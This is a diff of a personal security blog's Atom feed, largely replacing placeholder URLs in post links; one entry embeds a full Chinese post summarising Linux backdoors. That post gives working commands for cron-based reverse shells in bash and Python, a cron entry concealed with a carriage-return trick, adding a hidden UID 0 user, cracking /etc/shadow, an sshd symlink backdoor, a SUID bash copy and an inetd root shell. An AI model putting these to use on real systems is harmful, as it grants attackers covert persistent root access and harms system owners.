@@ -5,9 +5,9 @@
   <subtitle>FDrag0n的学习生涯</subtitle>
   <link href="/atom.xml" rel="self"/>
   
-  <link href="http://yoursite.com/"/>
+  <link href="http://fdrag0n.github.io/"/>
   <updated>2019-09-09T15:30:41.883Z</updated>
-  <id>http://yoursite.com/</id>
+  <id>http://fdrag0n.github.io/</id>
   
   <author>
     <name>FDrag0n</name>
@@ -18,8 +18,8 @@
   
   <entry>
     <title>pwn入门</title>
-    <link href="http://yoursite.com/2019/09/09/pwn%E5%85%A5%E9%97%A8/"/>
-    <id>http://yoursite.com/2019/09/09/pwn入门/</id>
+    <link href="http://fdrag0n.github.io/2019/09/09/pwn%E5%85%A5%E9%97%A8/"/>
+    <id>http://fdrag0n.github.io/2019/09/09/pwn入门/</id>
     <published>2019-09-09T13:44:55.000Z</published>
     <updated>2019-09-09T15:30:41.883Z</updated>
     
@@ -36,14 +36,14 @@
     </summary>
     
     
-      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
+      <category term="pwn" scheme="http://fdrag0n.github.io/tags/pwn/"/>
     
   </entry>
   
   <entry>
     <title>获取你耳机的蓝牙版本</title>
-    <link href="http://yoursite.com/2019/08/27/%E8%8E%B7%E5%8F%96%E4%BD%A0%E8%80%B3%E6%9C%BA%E7%9A%84%E8%93%9D%E7%89%99%E7%89%88%E6%9C%AC/"/>
-    <id>http://yoursite.com/2019/08/27/获取你耳机的蓝牙版本/</id>
+    <link href="http://fdrag0n.github.io/2019/08/27/%E8%8E%B7%E5%8F%96%E4%BD%A0%E8%80%B3%E6%9C%BA%E7%9A%84%E8%93%9D%E7%89%99%E7%89%88%E6%9C%AC/"/>
+    <id>http://fdrag0n.github.io/2019/08/27/获取你耳机的蓝牙版本/</id>
     <published>2019-08-27T07:34:55.000Z</published>
     <updated>2019-08-27T07:56:54.374Z</updated>
     
@@ -64,8 +64,8 @@
   
   <entry>
     <title>35C3-POST</title>
-    <link href="http://yoursite.com/2019/04/19/2019-4-19-35C3-POST/"/>
-    <id>http://yoursite.com/2019/04/19/2019-4-19-35C3-POST/</id>
+    <link href="http://fdrag0n.github.io/2019/04/19/2019-4-19-35C3-POST/"/>
+    <id>http://fdrag0n.github.io/2019/04/19/2019-4-19-35C3-POST/</id>
     <published>2019-04-19T02:47:49.000Z</published>
     <updated>2019-12-05T13:20:02.462Z</updated>
     
@@ -83,8 +83,8 @@
   
   <entry>
     <title>HCTF2018-hideandseek</title>
-    <link href="http://yoursite.com/2018/12/19/HCTF2018-hideandseek/"/>
-    <id>http://yoursite.com/2018/12/19/HCTF2018-hideandseek/</id>
+    <link href="http://fdrag0n.github.io/2018/12/19/HCTF2018-hideandseek/"/>
+    <id>http://fdrag0n.github.io/2018/12/19/HCTF2018-hideandseek/</id>
     <published>2018-12-19T02:47:49.000Z</published>
     <updated>2019-12-05T13:19:58.702Z</updated>
     
@@ -105,8 +105,8 @@
   
   <entry>
     <title>自用Linux命令手册</title>
-    <link href="http://yoursite.com/2018/11/11/%E8%87%AA%E7%94%A8Linux%E5%91%BD%E4%BB%A4%E6%89%8B%E5%86%8C/"/>
-    <id>http://yoursite.com/2018/11/11/自用Linux命令手册/</id>
+    <link href="http://fdrag0n.github.io/2018/11/11/%E8%87%AA%E7%94%A8Linux%E5%91%BD%E4%BB%A4%E6%89%8B%E5%86%8C/"/>
+    <id>http://fdrag0n.github.io/2018/11/11/自用Linux命令手册/</id>
     <published>2018-11-11T14:42:50.000Z</published>
     <updated>2018-11-12T11:57:42.710Z</updated>
     
@@ -120,18 +120,18 @@
     </summary>
     
     
-      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
+      <category term="linux" scheme="http://fdrag0n.github.io/tags/linux/"/>
     
   </entry>
   
   <entry>
     <title>Linux后门总结</title>
-    <link href="http://yoursite.com/2018/11/07/2018-11-7-Linux%E5%90%8E%E9%97%A8%E6%80%BB%E7%BB%93/"/>
-    <id>http://yoursite.com/2018/11/07/2018-11-7-Linux后门总结/</id>
+    <link href="http://fdrag0n.github.io/2018/11/07/2018-11-7-Linux%E5%90%8E%E9%97%A8%E6%80%BB%E7%BB%93/"/>
+    <id>http://fdrag0n.github.io/2018/11/07/2018-11-7-Linux后门总结/</id>
     <published>2018-11-07T11:09:37.000Z</published>
     <updated>2018-11-12T11:57:56.052Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><p>ubuntu16.04<br>反弹shell目标：127.0.0.1:233</p><h1 id="cron定时反弹shell"><a href="#cron定时反弹shell" class="headerlink" title="cron定时反弹shell"></a>cron定时反弹shell</h1><a id="more"></a><h2 id="修改crontab文件"><a href="#修改crontab文件" class="headerlink" title="修改crontab文件"></a>修改crontab文件</h2><p> 创建文件 /etc/…</p><pre><code>#!/bin/bashif netstat -ano|grep -v grep | grep &quot;127.0.0.1&quot;&gt;/dev/nullthenecho &quot;OK&quot;&gt;/dev/nullelse/sbin/iptables --policy INPUT ACCEPT/sbin/iptables --policy OUTPUT ACCEPTbash -i &gt;&amp; /dev/tcp/127.0.0.1/233 0&gt;&amp;1fi</code></pre><p>增加权限</p><p><code>chmod +sx /etc/...</code></p><p>然后在/etc/crontab中添加定时任务</p><p><code>*/1 * * * * root /etc/...</code></p><p>最后重启一下 crond 的服务<br><code>service cron reload</code></p><h2 id="一句话Crontab后门"><a href="#一句话Crontab后门" class="headerlink" title="一句话Crontab后门"></a>一句话Crontab后门</h2><p>bash版本<br><code>(crontab -l;printf &quot;*/1 * * * * exec 9&lt;&gt; /dev/tcp/127.0.0.1/233;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for</code>whoami<code>%100c\n&quot;)|crontab -</code><br>python版本<br><code>(crontab -l;printf &quot;*/5 * * * *  /usr/bin/python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,233));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;;\r\rno crontab for</code>whoami<code>%100c\n&quot;)|crontab -</code></p><h1 id="Linux-Unix-添加-UID-为-0-的用户"><a href="#Linux-Unix-添加-UID-为-0-的用户" class="headerlink" title="Linux/Unix 添加 UID 为 0 的用户"></a>Linux/Unix 添加 UID 为 0 的用户</h1><p>免交互设置密码<br>    useradd seradd -u 0 -o -g root -G fdrag0n</p><pre><code>echo &quot;passwd&quot; | passwd --stdin fdrag0n</code></pre><p>因为linux可能有密码策略<br>所以推荐使用强密码替换passwd</p><h1 id="爆破linux密码"><a href="#爆破linux密码" class="headerlink" title="爆破linux密码"></a>爆破linux密码</h1><p>取出/etc/shadow<br>hashcat爆破</p><h1 id="ssh公钥免密"><a href="#ssh公钥免密" class="headerlink" title="ssh公钥免密"></a>ssh公钥免密</h1><p>将客户端生成的ssh公钥写到所控服务器的~/.ssh/authorized_keys中，然后客户端利用私钥完成认证即可登录。</p><p>客户端：</p><pre><code>$ ssh-keygen -t rsa$ lsid_rsa  id_rsa.pub</code></pre><p>把id_rsa.pub写入服务端的authorized_keys中，并修改好相应权限。</p><p>服务端：</p><pre><code>$ chmod 600 ~/.ssh/authorized_keys$ chmod 700 ~/.ssh</code></pre><p>这种后门的特点是简单易用，但在实战中会被服务器的配置环境所限制，以及容易被发现(只要运维不傻)。</p><h1 id="软连接后门"><a href="#软连接后门" class="headerlink" title="软连接后门"></a>软连接后门</h1><pre><code>ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=23333;</code></pre><p>经典后门。直接对sshd建立软连接，之后用任意密码登录即可。</p><p>但这隐蔽性很弱，防护软件或者查看端口状态都可以找到。</p><p><strong>重启会断开</strong></p><h1 id="SUID-shell"><a href="#SUID-shell" class="headerlink" title="SUID shell"></a>SUID shell</h1><p>在root账号下执行</p><pre><code>cp /bin/bash /.fdrag0nchmod 4755 /.fdrag0n</code></pre><p>在普通用户下执行</p><pre><code>/.fdrag0n -p</code></pre><p><strong>检查手段</strong></p><pre><code>find / -perm +4000 -ls</code></pre><h1 id="inetd后门"><a href="#inetd后门" class="headerlink" title="inetd后门"></a>inetd后门</h1><p>修改 /etc/inetd.conf 文件</p><p>原文件：</p><pre><code>#chargen dgram udp wait root internal#discard stream tcp nowait root internal#discard dgram udp wait root internal#daytime stream tcp nowait root internal</code></pre><p>修改为:</p><pre><code>#discard stream tcp nowait root internal#discard dgram udp wait root internaldaytime stream tcp nowait root /bin/bash bash -i</code></pre><p>然后重启inetd</p><pre><code>ps -ef | grep inetdrootkill -HUP xxx</code></pre><p>然后nc连接即可</p><h1 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a>rootkit</h1><h2 id="openssh后门"><a href="#openssh后门" class="headerlink" title="openssh后门"></a>openssh后门</h2><p>参见<a href="https://fdrag0n.github.io/2018/05/15/SSH后门复现/" title="ssh后门复现" target="_blank" rel="noopener">https://fdrag0n.github.io/2018/05/15/SSH后门复现/</a></p><h2 id="内核级rookit"><a href="#内核级rookit" class="headerlink" title="内核级rookit"></a>内核级rookit</h2><p>暂未复现，复现后补上</p>]]></content>
+    <content type="html"><![CDATA[<h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><p>ubuntu16.04<br>反弹shell目标：127.0.0.1:233</p><h1 id="cron定时反弹shell"><a href="#cron定时反弹shell" class="headerlink" title="cron定时反弹shell"></a>cron定时反弹shell</h1><a id="more"></a><h2 id="修改crontab文件"><a href="#修改crontab文件" class="headerlink" title="修改crontab文件"></a>修改crontab文件</h2><p> 创建文件 /etc/…</p><pre><code>#!/bin/bashif netstat -ano|grep -v grep | grep &quot;127.0.0.1&quot;&gt;/dev/nullthenecho &quot;OK&quot;&gt;/dev/nullelse/sbin/iptables --policy INPUT ACCEPT/sbin/iptables --policy OUTPUT ACCEPTbash -i &gt;&amp; /dev/tcp/127.0.0.1/233 0&gt;&amp;1fi</code></pre><p>增加权限</p><p><code>chmod +sx /etc/...</code></p><p>然后在/etc/crontab中添加定时任务</p><p><code>*/1 * * * * root /etc/...</code></p><p>最后重启一下 crond 的服务<br><code>service cron reload</code></p><h2 id="一句话Crontab后门"><a href="#一句话Crontab后门" class="headerlink" title="一句话Crontab后门"></a>一句话Crontab后门</h2><p>bash版本<br><code>(crontab -l;printf &quot;*/1 * * * * exec 9&lt;&gt; /dev/tcp/127.0.0.1/233;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for</code>whoami<code>%100c\n&quot;)|crontab -</code><br>python版本<br><code>(crontab -l;printf &quot;*/5 * * * *  /usr/bin/python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,233));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;;\r\rno crontab for</code>whoami<code>%100c\n&quot;)|crontab -</code></p><h1 id="Linux-Unix-添加-UID-为-0-的用户"><a href="#Linux-Unix-添加-UID-为-0-的用户" class="headerlink" title="Linux/Unix 添加 UID 为 0 的用户"></a>Linux/Unix 添加 UID 为 0 的用户</h1><p>免交互设置密码<br>    useradd seradd -u 0 -o -g root -G fdrag0n</p><pre><code>echo &quot;passwd&quot; | passwd --stdin fdrag0n</code></pre><p>因为linux可能有密码策略<br>所以推荐使用强密码替换passwd</p><h1 id="爆破linux密码"><a href="#爆破linux密码" class="headerlink" title="爆破linux密码"></a>爆破linux密码</h1><p>取出/etc/shadow<br>hashcat爆破</p><h1 id="ssh公钥免密"><a href="#ssh公钥免密" class="headerlink" title="ssh公钥免密"></a>ssh公钥免密</h1><p>将客户端生成的ssh公钥写到所控服务器的~/.ssh/authorized_keys中，然后客户端利用私钥完成认证即可登录。</p><p>客户端：</p><pre><code>$ ssh-keygen -t rsa$ lsid_rsa  id_rsa.pub</code></pre><p>把id_rsa.pub写入服务端的authorized_keys中，并修改好相应权限。</p><p>服务端：</p><pre><code>$ chmod 600 ~/.ssh/authorized_keys$ chmod 700 ~/.ssh</code></pre><p>这种后门的特点是简单易用，但在实战中会被服务器的配置环境所限制，以及容易被发现(只要运维不傻)。</p><h1 id="软连接后门"><a href="#软连接后门" class="headerlink" title="软连接后门"></a>软连接后门</h1><pre><code>ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=23333;</code></pre><p>经典后门。直接对sshd建立软连接，之后用任意密码登录即可。</p><p>但这隐蔽性很弱，防护软件或者查看端口状态都可以找到。</p><p><strong>重启会断开</strong></p><h1 id="SUID-shell"><a href="#SUID-shell" class="headerlink" title="SUID shell"></a>SUID shell</h1><p>在root账号下执行</p><pre><code>cp /bin/bash /.fdrag0nchmod 4755 /.fdrag0n</code></pre><p>在普通用户下执行</p><pre><code>/.fdrag0n -p</code></pre><p><strong>检查手段</strong></p><pre><code>find / -perm +4000 -ls</code></pre><h1 id="inetd后门"><a href="#inetd后门" class="headerlink" title="inetd后门"></a>inetd后门</h1><p>修改 /etc/inetd.conf 文件</p><p>原文件：</p><pre><code>#chargen dgram udp wait root internal#discard stream tcp nowait root internal#discard dgram udp wait root internal#daytime stream tcp nowait root internal</code></pre><p>修改为:</p><pre><code>#discard stream tcp nowait root internal#discard dgram udp wait root internaldaytime stream tcp nowait root /bin/bash bash -i</code></pre><p>然后重启inetd</p><pre><code>ps -ef | grep inetdrootkill -HUP xxx</code></pre><p>然后nc连接即可</p><h1 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a>rootkit</h1><h2 id="openssh后门"><a href="#openssh后门" class="headerlink" title="openssh后门"></a>openssh后门</h2><p>参见<a href="https://fdrag0n.github.io/2018/05/15/SSH后门复现/" title="ssh后门复现">https://fdrag0n.github.io/2018/05/15/SSH后门复现/</a></p><h2 id="内核级rookit"><a href="#内核级rookit" class="headerlink" title="内核级rookit"></a>内核级rookit</h2><p>暂未复现，复现后补上</p>]]></content>
     
     <summary type="html">
     
@@ -141,14 +141,14 @@
     </summary>
     
     
-      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
+      <category term="linux" scheme="http://fdrag0n.github.io/tags/linux/"/>
     
   </entry>
   
   <entry>
     <title>HCTF2018-Kzone</title>
-    <link href="http://yoursite.com/2018/10/19/HCTF2018-Kzone/"/>
-    <id>http://yoursite.com/2018/10/19/HCTF2018-Kzone/</id>
+    <link href="http://fdrag0n.github.io/2018/10/19/HCTF2018-Kzone/"/>
+    <id>http://fdrag0n.github.io/2018/10/19/HCTF2018-Kzone/</id>
     <published>2018-10-19T14:19:24.000Z</published>
     <updated>2019-12-05T13:19:54.981Z</updated>
     
@@ -169,8 +169,8 @@
   
   <entry>
     <title>SCTF2018-nginx的秘密wp</title>
-    <link href="http://yoursite.com/2018/09/13/SCTF2018-nginx%E7%9A%84%E7%A7%98%E5%AF%86wp/"/>
-    <id>http://yoursite.com/2018/09/13/SCTF2018-nginx的秘密wp/</id>
+    <link href="http://fdrag0n.github.io/2018/09/13/SCTF2018-nginx%E7%9A%84%E7%A7%98%E5%AF%86wp/"/>
+    <id>http://fdrag0n.github.io/2018/09/13/SCTF2018-nginx的秘密wp/</id>
     <published>2018-09-13T14:19:24.000Z</published>
     <updated>2019-12-05T13:20:08.088Z</updated>
     
@@ -189,8 +189,8 @@
   
   <entry>
     <title>PHP数组与c数组差异而引发的安全问题</title>
-    <link href="http://yoursite.com/2018/08/24/PHP%E6%95%B0%E7%BB%84%E4%B8%8Ec%E6%95%B0%E7%BB%84%E5%B7%AE%E5%BC%82%E8%80%8C%E5%BC%95%E5%8F%91%E7%9A%84%E9%97%AE%E9%A2%98/"/>
-    <id>http://yoursite.com/2018/08/24/PHP数组与c数组差异而引发的问题/</id>
+    <link href="http://fdrag0n.github.io/2018/08/24/PHP%E6%95%B0%E7%BB%84%E4%B8%8Ec%E6%95%B0%E7%BB%84%E5%B7%AE%E5%BC%82%E8%80%8C%E5%BC%95%E5%8F%91%E7%9A%84%E9%97%AE%E9%A2%98/"/>
+    <id>http://fdrag0n.github.io/2018/08/24/PHP数组与c数组差异而引发的问题/</id>
     <published>2018-08-24T14:19:24.000Z</published>
     <updated>2019-08-19T03:00:15.638Z</updated>
     
@@ -211,8 +211,8 @@
   
   <entry>
     <title>利用autorun.inf预防自动运行病毒及个性化磁盘图标</title>
-    <link href="http://yoursite.com/2018/08/13/%E5%88%A9%E7%94%A8autorun-inf%E9%A2%84%E9%98%B2%E8%87%AA%E5%8A%A8%E8%BF%90%E8%A1%8C%E7%97%85%E6%AF%92%E5%8F%8A%E4%B8%AA%E6%80%A7%E5%8C%96%E7%A3%81%E7%9B%98%E5%9B%BE%E6%A0%87/"/>
-    <id>http://yoursite.com/2018/08/13/利用autorun-inf预防自动运行病毒及个性化磁盘图标/</id>
+    <link href="http://fdrag0n.github.io/2018/08/13/%E5%88%A9%E7%94%A8autorun-inf%E9%A2%84%E9%98%B2%E8%87%AA%E5%8A%A8%E8%BF%90%E8%A1%8C%E7%97%85%E6%AF%92%E5%8F%8A%E4%B8%AA%E6%80%A7%E5%8C%96%E7%A3%81%E7%9B%98%E5%9B%BE%E6%A0%87/"/>
+    <id>http://fdrag0n.github.io/2018/08/13/利用autorun-inf预防自动运行病毒及个性化磁盘图标/</id>
     <published>2018-08-13T02:37:01.000Z</published>
     <updated>2019-08-19T03:00:22.667Z</updated>
     
@@ -249,8 +249,8 @@ ICON=drag0n.ico
   
   <entry>
     <title>ctf常见隐写术总结</title>
-    <link href="http://yoursite.com/2018/07/30/ctf%E5%B8%B8%E8%A7%81%E9%9A%90%E5%86%99%E6%9C%AF%E6%80%BB%E7%BB%93/"/>
-    <id>http://yoursite.com/2018/07/30/ctf常见隐写术总结/</id>
+    <link href="http://fdrag0n.github.io/2018/07/30/ctf%E5%B8%B8%E8%A7%81%E9%9A%90%E5%86%99%E6%9C%AF%E6%80%BB%E7%BB%93/"/>
+    <id>http://fdrag0n.github.io/2018/07/30/ctf常见隐写术总结/</id>
     <published>2018-07-30T03:57:03.000Z</published>
     <updated>2019-08-19T03:00:30.632Z</updated>
     
@@ -271,8 +271,8 @@ ICON=drag0n.ico
   
   <entry>
     <title>破解中兴电视盒子</title>
-    <link href="http://yoursite.com/2018/07/19/%E7%A0%B4%E8%A7%A3%E4%B8%AD%E5%85%B4%E7%94%B5%E8%A7%86%E7%9B%92%E5%AD%90/"/>
-    <id>http://yoursite.com/2018/07/19/破解中兴电视盒子/</id>
+    <link href="http://fdrag0n.github.io/2018/07/19/%E7%A0%B4%E8%A7%A3%E4%B8%AD%E5%85%B4%E7%94%B5%E8%A7%86%E7%9B%92%E5%AD%90/"/>
+    <id>http://fdrag0n.github.io/2018/07/19/破解中兴电视盒子/</id>
     <published>2018-07-18T16:59:29.000Z</published>
     <updated>2019-08-19T03:00:34.180Z</updated>
     
@@ -294,8 +294,8 @@ ICON=drag0n.ico
   
   <entry>
     <title>SSH后门复现</title>
-    <link href="http://yoursite.com/2018/05/15/SSH%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/"/>
-    <id>http://yoursite.com/2018/05/15/SSH后门复现/</id>
+    <link href="http://fdrag0n.github.io/2018/05/15/SSH%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/"/>
+    <id>http://fdrag0n.github.io/2018/05/15/SSH后门复现/</id>
     <published>2018-05-15T12:01:46.000Z</published>
     <updated>2019-08-19T03:00:40.735Z</updated>
     
@@ -314,8 +314,8 @@ ICON=drag0n.ico
   
   <entry>
     <title>sql手注步骤（非盲注）</title>
-    <link href="http://yoursite.com/2018/05/05/sql%E6%89%8B%E6%B3%A8%E6%AD%A5%E9%AA%A4/"/>
-    <id>http://yoursite.com/2018/05/05/sql手注步骤/</id>
+    <link href="http://fdrag0n.github.io/2018/05/05/sql%E6%89%8B%E6%B3%A8%E6%AD%A5%E9%AA%A4/"/>
+    <id>http://fdrag0n.github.io/2018/05/05/sql手注步骤/</id>
     <published>2018-05-05T03:52:16.000Z</published>
     <updated>2019-08-19T03:00:47.758Z</updated>
     
@@ -327,17 +327,17 @@ ICON=drag0n.ico
     
     </summary>
     
-      <category term="sql" scheme="http://yoursite.com/categories/sql/"/>
+      <category term="sql" scheme="http://fdrag0n.github.io/categories/sql/"/>
     
     
-      <category term="sql" scheme="http://yoursite.com/tags/sql/"/>
+      <category term="sql" scheme="http://fdrag0n.github.io/tags/sql/"/>
     
   </entry>
   
   <entry>
     <title>利用kali破解wpa/wpa2加密的WIFI（爆破美学）</title>
-    <link href="http://yoursite.com/2018/05/01/%E5%88%A9%E7%94%A8kali%E7%A0%B4%E8%A7%A3wpa-wpa2%E5%8A%A0%E5%AF%86%E7%9A%84WIFI%EF%BC%88%E7%88%86%E7%A0%B4%E7%BE%8E%E5%AD%A6%EF%BC%89/"/>
-    <id>http://yoursite.com/2018/05/01/利用kali破解wpa-wpa2加密的WIFI（爆破美学）/</id>
+    <link href="http://fdrag0n.github.io/2018/05/01/%E5%88%A9%E7%94%A8kali%E7%A0%B4%E8%A7%A3wpa-wpa2%E5%8A%A0%E5%AF%86%E7%9A%84WIFI%EF%BC%88%E7%88%86%E7%A0%B4%E7%BE%8E%E5%AD%A6%EF%BC%89/"/>
+    <id>http://fdrag0n.github.io/2018/05/01/利用kali破解wpa-wpa2加密的WIFI（爆破美学）/</id>
     <published>2018-05-01T14:26:38.000Z</published>
     <updated>2019-08-19T03:00:57.541Z</updated>
     
@@ -349,17 +349,17 @@ ICON=drag0n.ico
     
     </summary>
     
-      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
+      <category term="kali" scheme="http://fdrag0n.github.io/categories/kali/"/>
     
     
-      <category term="kali" scheme="http://yoursite.com/tags/kali/"/>
+      <category term="kali" scheme="http://fdrag0n.github.io/tags/kali/"/>
     
   </entry>
   
   <entry>
     <title>文件包含漏洞常用命令</title>
-    <link href="http://yoursite.com/2018/04/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
-    <id>http://yoursite.com/2018/04/09/文件包含漏洞常用命令/</id>
+    <link href="http://fdrag0n.github.io/2018/04/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
+    <id>http://fdrag0n.github.io/2018/04/09/文件包含漏洞常用命令/</id>
     <published>2018-04-09T08:56:35.000Z</published>
     <updated>2019-08-19T03:01:02.385Z</updated>
     
@@ -376,8 +376,8 @@ ICON=drag0n.ico
   
   <entry>
     <title>打造手机渗透神器kali-linux-nethunter安装</title>
-    <link href="http://yoursite.com/2018/03/10/%E6%89%93%E9%80%A0%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8kali-linux-nethunter%E5%AE%89%E8%A3%85/"/>
-    <id>http://yoursite.com/2018/03/10/打造手机渗透神器kali-linux-nethunter安装/</id>
+    <link href="http://fdrag0n.github.io/2018/03/10/%E6%89%93%E9%80%A0%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8kali-linux-nethunter%E5%AE%89%E8%A3%85/"/>
+    <id>http://fdrag0n.github.io/2018/03/10/打造手机渗透神器kali-linux-nethunter安装/</id>
     <published>2018-03-10T04:59:57.000Z</published>
     <updated>2019-08-19T03:01:07.303Z</updated>
     
@@ -392,17 +392,17 @@ ICON=drag0n.ico
     
     </summary>
     
-      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
+      <category term="kali" scheme="http://fdrag0n.github.io/categories/kali/"/>
     
     
-      <category term="kali" scheme="http://yoursite.com/tags/kali/"/>
+      <category term="kali" scheme="http://fdrag0n.github.io/tags/kali/"/>
     
   </entry>
   
   <entry>
     <title>记一次解决某网站高速下载病毒</title>
-    <link href="http://yoursite.com/2018/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%A7%A3%E5%86%B3%E6%9F%90%E7%BD%91%E7%AB%99%E9%AB%98%E9%80%9F%E4%B8%8B%E8%BD%BD%E7%97%85%E6%AF%92/"/>
-    <id>http://yoursite.com/2018/02/11/记一次解决某网站高速下载病毒/</id>
+    <link href="http://fdrag0n.github.io/2018/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%A7%A3%E5%86%B3%E6%9F%90%E7%BD%91%E7%AB%99%E9%AB%98%E9%80%9F%E4%B8%8B%E8%BD%BD%E7%97%85%E6%AF%92/"/>
+    <id>http://fdrag0n.github.io/2018/02/11/记一次解决某网站高速下载病毒/</id>
     <published>2018-02-11T03:19:04.000Z</published>
     <updated>2019-08-19T03:01:11.640Z</updated>
     
@@ -415,14 +415,14 @@ ICON=drag0n.ico
     </summary>
     
     
-      <category term="病毒" scheme="http://yoursite.com/tags/%E7%97%85%E6%AF%92/"/>
+      <category term="病毒" scheme="http://fdrag0n.github.io/tags/%E7%97%85%E6%AF%92/"/>
     
   </entry>
   
   <entry>
     <title>kali更新源问题解决方案</title>
-    <link href="http://yoursite.com/2018/02/06/kali%E6%9B%B4%E6%96%B0%E6%BA%90%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
-    <id>http://yoursite.com/2018/02/06/kali更新源问题解决方案/</id>
+    <link href="http://fdrag0n.github.io/2018/02/06/kali%E6%9B%B4%E6%96%B0%E6%BA%90%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
+    <id>http://fdrag0n.github.io/2018/02/06/kali更新源问题解决方案/</id>
     <published>2018-02-06T04:17:06.000Z</published>
     <updated>2019-08-19T03:01:20.656Z</updated>
     
@@ -434,17 +434,17 @@ ICON=drag0n.ico
     
     </summary>
     
-      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
+      <category term="kali" scheme="http://fdrag0n.github.io/categories/kali/"/>
     
     
-      <category term="kali" scheme="http://yoursite.com/tags/kali/"/>
+      <category term="kali" scheme="http://fdrag0n.github.io/tags/kali/"/>
     
   </entry>
   
   <entry>
     <title>瞎搞的一次ms17-0100漏洞利用</title>
-    <link href="http://yoursite.com/2018/01/18/%E7%9E%8E%E6%90%9E%E7%9A%84%E4%B8%80%E6%AC%A1ms17-0100%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
-    <id>http://yoursite.com/2018/01/18/瞎搞的一次ms17-0100漏洞利用/</id>
+    <link href="http://fdrag0n.github.io/2018/01/18/%E7%9E%8E%E6%90%9E%E7%9A%84%E4%B8%80%E6%AC%A1ms17-0100%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    <id>http://fdrag0n.github.io/2018/01/18/瞎搞的一次ms17-0100漏洞利用/</id>
     <published>2018-01-18T02:22:42.000Z</published>
     <updated>2019-08-19T03:01:29.009Z</updated>
     
